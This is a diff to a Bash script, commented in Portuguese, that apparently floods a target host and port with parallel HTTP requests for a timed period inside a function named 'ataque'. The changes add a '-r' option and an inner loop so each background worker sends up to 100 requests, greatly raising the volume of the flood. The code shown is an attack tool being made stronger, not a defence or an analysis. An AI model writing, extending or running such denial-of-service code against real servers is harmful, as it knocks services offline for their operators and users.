@@ -57,6 +57,7 @@ echo 0 > $temp_file_fa # inicializando temp fa
 temp_file_su=$(mktemp)
 echo 0 > $temp_file_su # inicializa tem su
 tempo_espera=1
+max_req=100
 method="GET"
 headers=()
 payload=""
@@ -125,7 +126,8 @@ requisitar() {
     local port=$2
     local flags="-X ${method} ${headers[@]}"
     local lock="$(mktemp).lock"
-
+    
+    for ((i=0; i < "$max_req"; i++)); do
     (
     flock -e 200 || exit 1
     local fail=$(cat $temp_file_fa)
@@ -144,7 +146,7 @@ requisitar() {
 	echo $fail >$temp_file_fa
     fi
     ) 200>"$lock"
-
+    done
     rm -f "$lock"
 }
 
@@ -202,6 +204,10 @@ menu_check() {
 
     while [[ -n $1 ]]; do
         case "$1" in
+	-r)
+	    shift
+	    [[ "$1" -ge 1 ]] && max_req="$1"
+	    ;;
 	-m|--method)
 	    shift
 	    [[ -n "$1" ]] && method="$1"
@@ -271,7 +277,7 @@ ataque(){
     local host="$1"
     local port="$2"
     local t_ataque="$3"
-    local t_final="$((SECONDS + t_ataque))"
+    local t_final="$((SECONDS + t_ataque - $tempo_espera))"
 
     while [[ SECONDS -lt t_final  ]]; do 
 	[[ $ABORT -eq 1 ]] && {
@@ -281,10 +287,10 @@ ataque(){
 	} # se 1 loop quebrado.
 
        progress_bar $SECONDS 30 $t_final
-
-       requisitar $host $port &
+       requisitar $host $port & 
 
        ((controle++))
+
        if [[ "$controle" -ge "$threads_atual" ]]; then
           wait -n # Espera até que uma termine
 	  ((controle--))
